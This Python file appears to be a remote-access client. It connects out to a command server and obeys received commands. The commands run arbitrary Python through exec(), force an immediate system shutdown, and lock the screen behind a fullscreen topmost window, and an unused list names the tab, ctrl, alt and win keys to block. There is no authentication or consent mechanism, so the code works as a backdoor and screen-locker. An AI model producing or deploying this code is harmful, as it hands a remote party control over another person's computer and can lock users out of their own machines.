import socket
import sys
import os
import pyautogui
import keyboard
from _thread import start_new_thread as thread
from tkinter import (Tk, Label)

KEYS_TO_BLOCK = [
    'tab',
    'ctrl',
    'alt',
    'win',
]

class block_:
    pass
block_window = Tk()
block_window.destroy()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def shutdown(message):
    os.system("shutdown /s /f /t 0")

def execute(message):
    exec(message[8:])

def block(message):
    try:
        block_window.winfo_exists() #fails = it has been destroyed
        server.send(b"MESSAGE Screen is already blocked")

    except:
        block_window.__init__()
        Label(block_window, text=message[6:], font='Calibri 60').pack(expand=1)
        block_window.attributes('-fullscreen', True)
        block_window.overrideredirect(1)
        block_window.attributes('-topmost', True)
        server.send(b"MESSAGE Screen has been blocked") #block

def unblock(message):
    try:
        block_window.destroy()
        server.send(b"MESSAGE Screen has been unblocked")
    except:
        server.send(b"MESSAGE Screen has already been unblocked so uh you did nothing")


ACTIONS = {
    "EXECUTE": execute,
    "SHUTDOWN": shutdown,
    "BLOCK": block,
    "UNBLOCK": unblock,
}

IP = ''#the ip for serber
PORT = 31415
server.connect((IP, PORT))


while True:
    try:
        block_window.update()
        block_window.update_idletasks()
    except:
        pass

    message = server.recv(2048)
    real = str(message)[2:-1]
    try:
        ACTIONS[real.split()[0]](real)
    except Exception as e:
        print(e)
        print(real)
